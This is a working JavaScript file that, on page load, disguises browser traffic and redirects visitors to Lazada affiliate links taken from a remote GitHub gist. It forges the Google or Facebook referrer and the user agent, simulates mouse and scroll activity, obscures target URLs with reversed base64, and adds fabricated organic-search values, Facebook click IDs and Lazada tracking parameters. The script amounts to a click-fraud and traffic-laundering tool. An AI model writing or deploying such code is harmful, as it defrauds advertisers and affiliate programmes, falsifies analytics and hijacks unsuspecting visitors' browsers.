class TrafficHandler {
    constructor() {
        this.visitId = this.generateId();
        this.gistUrl = 'https://gist.githubusercontent.com/3snanugraha/5794adf5a74a06531d7bd8edf85408d0/raw';
        this.links = null;
        this.behaviors = ['scroll', 'move', 'click', 'focus'];
        this.executed = false;

        Object.defineProperty(document, 'referrer', {
            get: () => 'https://www.google.com/search?q=online+shop'
        });

        this.overrideNavigator();
        this.initializeLinks();
    }

    async initializeLinks() {
        try {
            const response = await fetch(this.gistUrl);
            this.links = await response.json();
            this.targetUrl = this.encodeTarget(this.getTargetLink());
        } catch (error) {
            console.error('Error fetching links:', error);
            this.targetUrl = this.encodeTarget('https://c.lazada.co.id/t/c.bheMzB');
        }
    }

    overrideNavigator() {
        const navigatorProxy = new Proxy(window.navigator, {
            get: (target, prop) => {
                switch(prop) {
                    case 'userAgent':
                        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
                    case 'platform':
                        return 'Win32';
                    default:
                        return target[prop];
                }
            }
        });
        
        Object.defineProperty(window, 'navigator', {
            value: navigatorProxy,
            writable: false
        });
    }

    getTargetLink() {
        const links = this.links.links;
        const rotation = this.links.config.rotation;

        switch(rotation) {
            case 'weighted':
                return this.getWeightedLink(links);
            case 'sequential':
                return this.getSequentialLink(links);
            default:
                return this.getRandomLink(links);
        }
    }

    getWeightedLink(links) {
        const totalWeight = links.reduce((sum, link) => sum + link.weight, 0);
        let random = Math.random() * totalWeight;
        
        for (let link of links) {
            random -= link.weight;
            if (random <= 0) return link.url;
        }
        return links[0].url;
    }

    getRandomLink(links) {
        return links[Math.floor(Math.random() * links.length)].url;
    }

    getSequentialLink(links) {
        this.currentIndex = (this.currentIndex || 0) % links.length;
        const url = links[this.currentIndex].url;
        this.currentIndex++;
        return url;
    }

    generateId() {
        return 'vid_' + Math.random().toString(36).substr(2, 9);
    }

    encodeTarget(url) {
        return btoa(url).split('').reverse().join('');
    }

    decodeTarget(encoded) {
        return atob(encoded.split('').reverse().join(''));
    }

    initBehaviors() {
        const randomBehaviors = this.shuffleArray(this.behaviors);
        randomBehaviors.forEach(behavior => {
            this.executeBehavior(behavior);
        });
    }

    shuffleArray(array) {
        return array.sort(() => Math.random() - 0.5);
    }

    executeBehavior(type) {
        switch(type) {
            case 'scroll':
                window.scrollTo({
                    top: Math.random() * 100,
                    behavior: 'smooth'
                });
                break;
            case 'move':
                document.dispatchEvent(new MouseEvent('mousemove', {
                    bubbles: true,
                    clientX: Math.random() * window.innerWidth,
                    clientY: Math.random() * window.innerHeight
                }));
                break;
            case 'click':
                document.dispatchEvent(new MouseEvent('click'));
                break;
            case 'focus':
                window.focus();
                break;
        }
    }

    async redirect() {
        if (this.executed) return;
        this.executed = true;

        if (!this.links) {
            await this.initializeLinks();
        }

        const stealthParams = new URLSearchParams({
            vid: this.visitId,
            t: Date.now(),
            ref: 'google',
            source: 'organic',
            medium: 'search'
        }).toString();

        const finalUrl = `${this.decodeTarget(this.targetUrl)}?${stealthParams}`;
        window.location.href = finalUrl;
    }
}

class FacebookTrafficHandler extends TrafficHandler {
    constructor() {
        super();
        this.fbParams = {
            fbclid: this.generateFbclid(),
            __tn__: '-UK-R',
            'c[0]': this.generateFbContext()
        };
    }

    generateFbclid() {
        return 'IwZ' + this.generateRandomString(61) + '_aem_MKAU11vaaqq0E94ap0bc4A';
    }

    generateFbContext() {
        return `AT${this.generateRandomString(3)}-Y_${this.generateRandomString(45)}`;
    }

    generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    }

    createFacebookUrl(targetUrl) {
        const fbUrl = new URL('https://l.facebook.com/l.php');
        const encodedUrl = encodeURIComponent(targetUrl);
        
        // Set primary parameters
        fbUrl.searchParams.set('u', encodedUrl);
        fbUrl.searchParams.set('h', `AT${this.generateRandomString(30)}`);
        fbUrl.searchParams.set('fbclid', this.fbParams.fbclid);
        fbUrl.searchParams.set('__tn__', this.fbParams.__tn__);
        fbUrl.searchParams.set('c[0]', this.fbParams['c[0]']);
        
        return fbUrl.toString();
    }

    redirect() {
        if (this.executed) return;
        this.executed = true;

        // Generate Lazada tracking parameters
        const stealthParams = new URLSearchParams({
            trafficFrom: '17449020_303586',
            laz_trackid: '2:mm_378210331_225200849_2180200849',
            mkttid: `clk${this.generateRandomString(20)}`
        }).toString();

        // Create final URLs
        const targetUrl = `${this.decodeTarget(this.targetUrl)}?${stealthParams}`;
        const facebookUrl = this.createFacebookUrl(targetUrl);
        
        // Set Facebook referrer
        Object.defineProperty(document, 'referrer', {
            get: () => 'https://www.facebook.com/'
        });

        // Execute redirect
        window.location.href = facebookUrl;
    }
}

// Initialize and execute
const handler = new TrafficHandler();
setTimeout(() => {
    handler.initBehaviors();
    handler.redirect();
}, 1500 + Math.random() * 2000);
